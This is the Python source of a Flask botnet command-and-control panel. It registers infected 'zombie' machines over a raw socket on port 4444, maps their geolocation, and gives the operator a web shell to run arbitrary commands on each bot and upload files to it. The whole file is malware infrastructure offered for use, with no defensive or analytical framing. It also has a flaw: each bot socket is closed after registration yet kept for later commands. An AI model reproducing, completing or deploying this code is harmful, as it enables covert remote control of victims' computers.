from flask import Flask, render_template_string, jsonify, request
import sqlite3
import socket
import threading
import os
import json

app = Flask(__name__)

DATABASE = "bots.db"
connected_bots = {}  # Store connected bot sockets for communication

# Initialize the database
def init_db():
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            ip TEXT,
                            os TEXT,
                            country_code TEXT,
                            latitude REAL,
                            longitude REAL,
                            status TEXT
                          )''')
        conn.commit()

def add_bot(ip, os_info, country_code, latitude, longitude):
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute("INSERT INTO bots (ip, os, country_code, latitude, longitude, status) VALUES (?, ?, ?, ?, ?, ?)",
                       (ip, os_info, country_code, latitude, longitude, "Online"))
        conn.commit()

def get_bot_by_id(bot_id):
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM bots WHERE id=?", (bot_id,))
        return cursor.fetchone()

# Handle bot connection
def bot_handler(client_socket):
    try:
        bot_data = client_socket.recv(4096).decode()
        bot_info = json.loads(bot_data)
        ip = bot_info["ip"]
        os_info = bot_info["os"]
        country_code = bot_info["country_code"]
        latitude = bot_info["latitude"]
        longitude = bot_info["longitude"]

        add_bot(ip, os_info, country_code, latitude, longitude)
        connected_bots[ip] = client_socket
        print(f"Bot connected: {ip} ({os_info})")
    except Exception as e:
        print(f"Error handling bot connection: {e}")
    finally:
        client_socket.close()

# Listen for incoming bot connections
def start_bot_listener():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 4444))
    server_socket.listen()
    print("CNC server is listening for bots on port 4444...")
    while True:
        client_socket, _ = server_socket.accept()
        threading.Thread(target=bot_handler, args=(client_socket,)).start()

@app.route("/")
def index():
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM bots")
        bots = cursor.fetchall()
    return render_template_string(index_template, bots=bots)

@app.route("/map")
def map_view():
    with sqlite3.connect(DATABASE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT ip, latitude, longitude FROM bots WHERE status = 'Online'")
        locations = cursor.fetchall()
    return render_template_string(map_template, locations=locations)

@app.route("/bot/<int:bot_id>")
def bot_overview(bot_id):
    bot = get_bot_by_id(bot_id)
    if bot:
        return render_template_string(bot_template, bot=bot)
    else:
        return "Bot not found", 404

@app.route("/bot/<int:bot_id>/upload", methods=["POST"])
def upload_file(bot_id):
    """
    Upload a file to the bot's system.
    """
    bot = get_bot_by_id(bot_id)
    if not bot:
        return "Bot not found", 404

    ip = bot[1]
    if "file" not in request.files:
        return "No file uploaded", 400
    file = request.files["file"]
    try:
        bot_socket = connected_bots.get(ip)
        if not bot_socket:
            return "Bot is not connected", 500

        # Send upload command to the bot
        bot_socket.sendall(json.dumps({"action": "upload_file", "filename": file.filename}).encode())
        bot_socket.recv(1024)  # Wait for acknowledgment
        bot_socket.sendfile(file.stream)
        response = bot_socket.recv(4096).decode()
        return jsonify(json.loads(response))
    except Exception as e:
        return str(e), 500

@app.route("/bot/<int:bot_id>/command", methods=["POST"])
def send_command(bot_id):
    """
    Send a command to a specific bot.
    """
    bot = get_bot_by_id(bot_id)
    if not bot:
        return "Bot not found", 404

    ip = bot[1]
    command = request.json.get("command")
    try:
        bot_socket = connected_bots.get(ip)
        if not bot_socket:
            return "Bot is not connected", 500

        bot_socket.sendall(json.dumps({"action": "execute_command", "command": command}).encode())
        response = bot_socket.recv(4096).decode()
        return jsonify({"response": response})
    except Exception as e:
        return str(e), 500

# Templates
index_template = """
<!DOCTYPE html>
<html>
<head><title>CNC Panel</title></head>
<body>
    <h1>Control Panel</h1>
    <h2>Zombies Online: {{ bots|length }}</h2>
    <table>
        <thead>
            <tr><th>ID</th><th>IP</th><th>OS</th><th>Country Code</th><th>Status</th><th>Actions</th></tr>
        </thead>
        <tbody>
            {% for bot in bots %}
            <tr>
                <td>{{ bot[0] }}</td><td>{{ bot[1] }}</td><td>{{ bot[2] }}</td><td>{{ bot[3] }}</td><td>{{ bot[6] }}</td>
                <td><a href="/bot/{{ bot[0] }}">Overview</a></td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
    <a href="/map">View Map</a>
</body>
</html>
"""

map_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Bot Locations</title>
    <script src="https://unpkg.com/leaflet"></script>
</head>
<body>
    <h1>Bot Locations</h1>
    <div id="map" style="height: 500px;"></div>
    <script>
        const map = L.map('map').setView([0, 0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors'
        }).addTo(map);

        const locations = {{ locations|tojson }};
        locations.forEach(location => {
            if (location[1] !== null && location[2] !== null) {
                L.marker([location[1], location[2]]).addTo(map)
                    .bindPopup(`IP: ${location[0]}`);
            }
        });
    </script>
</body>
</html>
"""

bot_template = """
<!DOCTYPE html>
<html>
<head><title>Bot Overview</title></head>
<body>
    <h1>Bot Overview: {{ bot[1] }} ({{ bot[3] }})</h1>
    <div>
        <h2>File Upload</h2>
        <form id="upload-form" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit">Upload</button>
        </form>
        <div id="upload-response"></div>
    </div>
    <div>
        <h2>Command Shell</h2>
        <textarea id="command-output" rows="10" cols="50" readonly></textarea>
        <br>
        <input type="text" id="command-input" placeholder="Enter command">
        <button onclick="sendCommand()">Run</button>
    </div>
    <script>
        const botId = {{ bot[0] }};
        document.getElementById("upload-form").onsubmit = function(event) {
            event.preventDefault();
            const formData = new FormData(event.target);
            fetch(`/bot/${botId}/upload`, { method: "POST", body: formData })
                .then(res => res.json())
                .then(data => {
                    document.getElementById("upload-response").innerText = JSON.stringify(data);
                })
                .catch(err => {
                    document.getElementById("upload-response").innerText = "Error: " + err;
                });
        };

        const commandOutput = document.getElementById("command-output");
        function sendCommand() {
            const command = document.getElementById("command-input").value;
            fetch(`/bot/${botId}/command`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ command })
            }).then(res => res.json()).then(data => {
                commandOutput.value += data.response || data.error;
            });
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    init_db()
    threading.Thread(target=start_bot_listener, daemon=True).start()
    app.run(host="0.0.0.0", port=9999)
